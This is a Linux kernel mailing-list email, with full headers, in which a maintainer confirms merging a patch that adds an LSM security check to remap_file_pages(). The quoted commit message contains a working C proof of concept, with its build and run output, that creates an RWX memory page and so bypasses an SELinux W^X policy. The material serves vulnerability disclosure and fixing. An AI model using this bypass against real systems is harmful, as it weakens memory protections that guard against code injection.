Received: from mail-yw1-f173.google.com (mail-yw1-f173.google.com [209.85.128.173])
	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id DB5DB198E65
	for <linux-security-module@vger.kernel.org>; Thu, 19 Sep 2024 08:14:06 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=209.85.128.173
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1726733648; cv=none; b=STqsN1T0FYZ5o6RDcHMma38Lq4D7+FLphLhQUjjTSK5gGaDgbuhGEG91kwkqcVOoAU9/qcSM2VzSutLGa0hpZKzPKnhKB3L1wV1wAd6MFchkDjOgErggrMXHdKLrpMaM/5svoQrBqiClKDXqCaDD+V0lnBx2lnyBZQltwTFkcU0=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1726733648; c=relaxed/simple;
	bh=XAsFhWHsdHytBSDeE5YcAEVe0B2u+XI+ZL2axPHiqRE=;
	h=MIME-Version:References:In-Reply-To:From:Date:Message-ID:Subject:
	 To:Cc:Content-Type; b=AWFOkU52e6AQnt8fM6i4y4HIcf2HF5vkgWpguDRkCBtrg4U+CkcrGLskPbHoGRtpbw1cvpa9r+rGf7aJWVZsd/VkIuMm/5jb4gjgrSEvHNDEUnStxokPBPJv86su1c35ZcLyqALJcOvSh+TZPg4Jbpxwr8ZjFGjAdeB05LFWzbg=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=paul-moore.com; spf=pass smtp.mailfrom=paul-moore.com; dkim=pass (2048-bit key) header.d=paul-moore.com header.i=@paul-moore.com header.b=IsYjYSh8; arc=none smtp.client-ip=209.85.128.173
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=paul-moore.com
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=paul-moore.com
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=paul-moore.com header.i=@paul-moore.com header.b="IsYjYSh8"
Received: by mail-yw1-f173.google.com with SMTP id 00721157ae682-6db20e22c85so4745787b3.0
        for <linux-security-module@vger.kernel.org>; Thu, 19 Sep 2024 01:14:06 -0700 (PDT)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=paul-moore.com; s=google; t=1726733646; x=1727338446; darn=vger.kernel.org;
        h=content-transfer-encoding:cc:to:subject:message-id:date:from
         :in-reply-to:references:mime-version:from:to:cc:subject:date
         :message-id:reply-to;
        bh=QvabaifNj3In5vF9Dr1bxXne5NhXbr/0+/BClonZfwY=;
        b=IsYjYSh8GWbWljS+osGzbOzekWJxSuGjtcCM6ejuoc/LTQhUh3jnGWK740Q/EhpFuN
         JtfpeaOVY2cPdOB1OLckfokr+bBLIt04bGNz7iU0k/NHDZbOzdbjdp6vrle4RodVFFEa
         0JkE0V4CytWm0Mh97KQ8MNV2KMDm/KlK4CNF5DyTG5nLq0ODuysnMz1evafgp/LOeBlV
         uil6BjMSl/h7Po7zLM2GUDf6bi6rkpyKwUJxevlh1BL83nmLYS9zCcKGJA3jNesCRawW
         qte431GWzjqq/t1VzArZhEWw4A/mfKIS2Ho02NC1RXqPluWYYnEuqpMLRLkPwtjFz830
         4dIA==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20230601; t=1726733646; x=1727338446;
        h=content-transfer-encoding:cc:to:subject:message-id:date:from
         :in-reply-to:references:mime-version:x-gm-message-state:from:to:cc
         :subject:date:message-id:reply-to;
        bh=QvabaifNj3In5vF9Dr1bxXne5NhXbr/0+/BClonZfwY=;
        b=fFh71ue2pDIbq5Iv1iNyMpHSlVXvoC2cjQMJbj0n91LTEzebv53u8jH/g3IY+B2k9M
         fZnnHpQibwrEhbnWX5wkEwN8Cm8C7niUZejqS8DIzPwTP8jufExrJOKWumP/EQ+4Zx5C
         wST9z56H5zi9/nrmrPZytLeD3Jl/PkHdDmfaq1Nl40y2R3x75oTyR25mW7dgG0jnzx6v
         NkW1rszLNOTVRkilnw2+wb2D7RQT3Yd7l8/A3WPXJxZxNNm2ukVLxn0zi8X9ldnHj8vy
         HDsLSpvlo4vGAwOrIaTpefRm8mof+Oc+DSN1O0L0dC/FBQgeVgcAslR/uVdjjP10gNIK
         Nwuw==
X-Gm-Message-State: AOJu0Yzgye4f+y7VGEcMSXXidVYB2uTYGeJ7K518iIEki5U6Y788CyHM
	Bq9WUjaw3clDeX88fsDYsOwov6Q7trcx9fqc1EZNYYZE3V1jU2pUGs3DcgPG+w2ZbiKjALLTenI
	OScVAHloVEikzmKWtVJzv9s9Lno17A6Kbd7RooJga+OmCHWCvCg==
X-Google-Smtp-Source: AGHT+IEpgaVMJ2zXX7Bxf0S7zhjSoCtdZL3ewODqwocfT6IJDtlugmG7DbcNQpbt4d4FVnJMr0I/+wGdR0KtiRdLxpQ=
X-Received: by 2002:a05:690c:385:b0:6b0:d9bc:5a29 with SMTP id
 00721157ae682-6dbb6b95936mr226254977b3.32.1726733645745; Thu, 19 Sep 2024
 01:14:05 -0700 (PDT)
Precedence: bulk
X-Mailing-List: linux-security-module@vger.kernel.org
List-Id: <linux-security-module.vger.kernel.org>
List-Subscribe: <mailto:linux-security-module+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:linux-security-module+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
References: <20240919080905.4506-2-paul@paul-moore.com>
In-Reply-To: <20240919080905.4506-2-paul@paul-moore.com>
From: Paul Moore <paul@paul-moore.com>
Date: Thu, 19 Sep 2024 04:13:54 -0400
Message-ID: <CAHC9VhSGxgXB5wmVKyqaGATPXV51XDjg20qOkppcfGasULOCNw@mail.gmail.com>
Subject: Re: [PATCH] mm: call the security_mmap_file() LSM hook in remap_file_pages()
To: linux-security-module@vger.kernel.org, linux-mm@kvack.org, 
	selinux@vger.kernel.org
Cc: ebpqwerty472123@gmail.com
Content-Type: text/plain; charset="UTF-8"
Content-Transfer-Encoding: quoted-printable

On Thu, Sep 19, 2024 at 4:09=E2=80=AFAM Paul Moore <paul@paul-moore.com> wr=
ote:
>
> From: Shu Han <ebpqwerty472123@gmail.com>
>
> The remap_file_pages syscall handler calls do_mmap() directly, which
> doesn't contain the LSM security check. And if the process has called
> personality(READ_IMPLIES_EXEC) before and remap_file_pages() is called fo=
r
> RW pages, this will actually result in remapping the pages to RWX,
> bypassing a W^X policy enforced by SELinux.
>
> So we should check prot by security_mmap_file LSM hook in the
> remap_file_pages syscall handler before do_mmap() is called. Otherwise, i=
t
> potentially permits an attacker to bypass a W^X policy enforced by
> SELinux.
>
> The bypass is similar to CVE-2016-10044, which bypass the same thing via
> AIO and can be found in [1].
>
> The PoC:
>
> $ cat > test.c
>
> int main(void) {
>         size_t pagesz =3D sysconf(_SC_PAGE_SIZE);
>         int mfd =3D syscall(SYS_memfd_create, "test", 0);
>         const char *buf =3D mmap(NULL, 4 * pagesz, PROT_READ | PROT_WRITE=
,
>                 MAP_SHARED, mfd, 0);
>         unsigned int old =3D syscall(SYS_personality, 0xffffffff);
>         syscall(SYS_personality, READ_IMPLIES_EXEC | old);
>         syscall(SYS_remap_file_pages, buf, pagesz, 0, 2, 0);
>         syscall(SYS_personality, old);
>         // show the RWX page exists even if W^X policy is enforced
>         int fd =3D open("/proc/self/maps", O_RDONLY);
>         unsigned char buf2[1024];
>         while (1) {
>                 int ret =3D read(fd, buf2, 1024);
>                 if (ret <=3D 0) break;
>                 write(1, buf2, ret);
>         }
>         close(fd);
> }
>
> $ gcc test.c -o test
> $ ./test | grep rwx
> 7f1836c34000-7f1836c35000 rwxs 00002000 00:01 2050 /memfd:test (deleted)
>
> Link: https://project-zero.issues.chromium.org/issues/42452389 [1]
> Cc: stable@vger.kernel.org
> Signed-off-by: Shu Han <ebpqwerty472123@gmail.com>
> Acked-by: Stephen Smalley <stephen.smalley.work@gmail.com>
> [PM: subject line tweaks]
> Signed-off-by: Paul Moore <paul@paul-moore.com>
> ---
>  mm/mmap.c | 4 ++++
>  1 file changed, 4 insertions(+)

I've just merged this into the lsm/stable-6.12 branch and plan to send
this to Linus shortly.

--=20
paul-moore.com
